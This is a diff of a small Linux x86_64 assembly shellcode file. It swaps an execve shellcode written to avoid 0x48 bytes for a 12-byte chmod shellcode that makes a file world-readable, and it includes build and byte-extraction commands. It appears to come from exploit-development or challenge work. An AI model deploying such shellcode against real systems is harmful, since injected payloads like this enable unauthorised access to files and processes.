@@ -1,5 +1,5 @@
 #
-# exec-no-H.s - Linux/x86_64 exec without 0x48 bytes
+# chmod-tiny.s - 12-bytes Linux/x86_64 chmod 4 shellcode 
 # Copyright (c) 2025 Marco Ivaldi <raptor@0xdeadbeef.info>
 #
 # Shellcode inspired by a challenge that shall remain unnamed to prevent 
@@ -8,7 +8,7 @@
 # Useful commands:
 # $ gcc -nostdlib -static shellcode.s -o shellcode-elf
 # $ objdump -M intel -d shellcode-elf
-# $ strace ./shellcode-elf
+# $ strace ./shellcode-elf # doesn't work with with self-modifying code
 # $ objcopy --dump-section .text=shellcode-raw shellcode-elf
 # $ xxd -p shellcode-raw | tr -d '\n' | sed 's/../\\x&/g'
 #
@@ -18,18 +18,10 @@
 
 .text
 _start:
-    # execve(".//x", NULL, NULL)
-    push 0x782f2f2e
-    push rsp
-    pop rdi             # ".//x"
-
-    push 1
-    pop rsi
-    dec esi             # 0 (NULL)
-
-    push 1
-    pop rdx
-    dec edx             # 0 (NULL)
-
-    mov al, 59          # execve
-    syscall             
+    # chmod("x", 004)
+    push 0x78
+    mov rdi, rsp        # "x"
+    push 4
+    pop rsi             # 0004
+    mov al, 0x5a        # chmod
+    syscall
